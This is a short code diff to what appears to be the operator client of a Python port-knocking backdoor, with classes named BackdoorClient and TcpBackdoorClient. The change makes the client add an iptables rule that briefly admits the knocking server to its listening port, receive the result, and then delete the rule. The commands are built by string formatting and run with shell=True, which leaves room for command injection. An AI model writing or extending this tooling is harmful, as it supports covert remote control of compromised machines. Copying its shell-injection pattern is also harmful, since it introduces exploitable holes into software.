@@ -9,6 +9,7 @@ import Crypto.Cipher
 import Queue
 import random
 import struct
+import subprocess
 import sys
 import time
 import traceback
@@ -521,13 +522,16 @@ class BackdoorClient(object):
             if not pkts:
                 continue
 
+            # allow traffic from this host to our listening port
             # should probably do a sanity check here as well to make sure that the server connecting to us is the same one that we configured via command line
-            # TODO: add firewall rule allowing server to connect to lport
+            iptables_rule = "INPUT -p tcp -s {} --dport {} -j ACCEPT".format(knocker, self.lport)
+
+            subprocess.call("iptables -A {}".format(iptables_rule), shell=True)
             result = self.recv_result()
+            subprocess.call("iptables -D {}".format(iptables_rule), shell=True)
 
             print("Received result:")
             print(str(result))
-            # TODO: remove firewall exception
 	
 class TcpBackdoorClient(BackdoorClient):
     def __init__(self, aeskey, password, listenport, serverport, server):
